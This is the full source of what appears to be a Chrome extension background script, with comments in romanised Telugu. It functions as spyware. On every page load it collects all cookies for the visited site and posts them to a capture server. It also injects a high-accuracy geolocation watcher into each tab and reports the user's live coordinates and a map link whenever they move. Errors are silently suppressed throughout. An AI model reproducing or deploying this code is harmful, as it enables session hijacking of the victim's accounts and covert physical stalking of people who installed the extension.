const SERVER_URL = 'http://localhost:5000/capture-log';
let lastLat = null;
let lastLng = null;

const sendToServer = (data) => {
  fetch(SERVER_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  }).catch(() => {});
};

// Universal Cookie Capture
const captureAllCookies = (url) => {
  try {
    const domain = new URL(url).hostname;
    chrome.cookies.getAll({ domain: domain }, (cookies) => {
      if (cookies && cookies.length > 0) {
        const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
        sendToServer({
          url: url,
          cookies: cookieStr,
          sessionStorage: {
            type: "UNIVERSAL_COOKIE_SYNC",
            domain: domain,
            user_agent: navigator.userAgent
          },
          timestamp: new Date().toLocaleString()
        });
      }
    });
  } catch (e) {}
};

// Live Location Tracking with Movement Detection
const startLiveTracking = (tabId) => {
  chrome.scripting.executeScript({
    target: { tabId: tabId },
    func: () => {
      if (window.isTrackingSet) return;
      window.isTrackingSet = true;

      navigator.geolocation.watchPosition((pos) => {
        const coords = { lat: pos.coords.latitude, lng: pos.coords.longitude };
        // Background ki update pampadam
        chrome.runtime.sendMessage({ type: "LIVE_LOC_UPDATE", data: coords });
      }, null, { enableHighAccuracy: true, distanceFilter: 50 }); // 50 meters kante ekkuva kadilithe trigger avthundhi
    }
  }).catch(() => {});
};

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url && tab.url.startsWith('http')) {
    captureAllCookies(tab.url);
    startLiveTracking(tabId);
  }
});

chrome.runtime.onMessage.addListener((msg) => {
  if (msg.type === "LIVE_LOC_UPDATE") {
    const { lat, lng } = msg.data;

    // Oke place lo unte (significant change lekapothe) sync cheyam
    const dist = lastLat ? Math.sqrt(Math.pow(lat - lastLat, 2) + Math.pow(lng - lastLng, 2)) : 1;

    if (!lastLat || dist > 0.0001) { // Apprx 10-20 meters movement check
      lastLat = lat;
      lastLng = lng;

      sendToServer({
        url: "Live Location Tracker (Movement)",
        cookies: "GPS_LIVE",
        sessionStorage: {
          lat: lat,
          lng: lng,
          status: "Moving",
          map_url: `https://www.google.com/maps?q=${lat},${lng}`
        },
        timestamp: new Date().toLocaleString()
      });
    }
  }
});
